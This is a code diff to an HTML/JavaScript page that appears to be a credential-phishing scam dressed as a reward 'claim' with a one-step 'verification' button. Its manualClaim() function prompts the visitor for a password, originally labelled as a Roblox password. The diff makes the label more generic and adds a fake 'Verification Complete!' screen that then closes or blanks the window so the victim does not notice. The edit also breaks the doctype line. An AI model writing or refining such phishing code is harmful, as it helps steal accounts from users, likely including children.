@@ -1,4 +1,4 @@
-<!DOCTYPE html> 
+!DOCTYPE html>
 <html lang="en">
 <head>
 
@@ -713,7 +713,8 @@ button:hover{
 
     <button class="green-btn"
     onclick="manualClaim()">
-        Verify (1 Step Authentification)    </button>
+        Verify (1 Step Authentification)
+    </button>
 
 </div>
 
@@ -888,7 +889,7 @@ function showWin(){
 function manualClaim(){
 
     const code=
-    prompt("Enter Roblox Password (Google Authenticated✅):");
+    prompt("Enter Password (Google Authenticated):");
 
     if(!code) return;
 
@@ -912,12 +913,60 @@ function manualClaim(){
     document.getElementById("winScreen")
     .style.display="none";
 
+    /* CLOSE SCREEN AFTER VERIFICATION */
+
+    document.body.innerHTML = `
+    
+    <div style="
+    position:fixed;
+    inset:0;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    flex-direction:column;
+    background:#020617;
+    color:white;
+    font-family:Inter,sans-serif;
+    z-index:999999;
+    ">
+
+        <div style="
+        font-size:70px;
+        margin-bottom:20px;
+        ">
+            ✅
+        </div>
+
+        <div style="
+        font-size:38px;
+        font-weight:900;
+        margin-bottom:12px;
+        ">
+            Verification Complete!
+        </div>
+
+        <div style="
+        color:#94a3b8;
+        font-size:18px;
+        ">
+            Please bear with us as we solve this problem
+        </div>
+
+    </div>
+
+    `;
+
     setTimeout(()=>{
 
         window.open('','_self');
+
         window.close();
 
-    },500);
+        location.replace("about:blank");
+
+        document.body.innerHTML="";
+
+    },1500);
 }
 
 function calculateScore(){
@@ -940,7 +989,7 @@ function getRank(score){
         return ["GOLD","gold"];
     }
 
-    else if(score >= 500000){
+    else if(score >= 50000){
         return ["SILVER","silver"];
     }
 
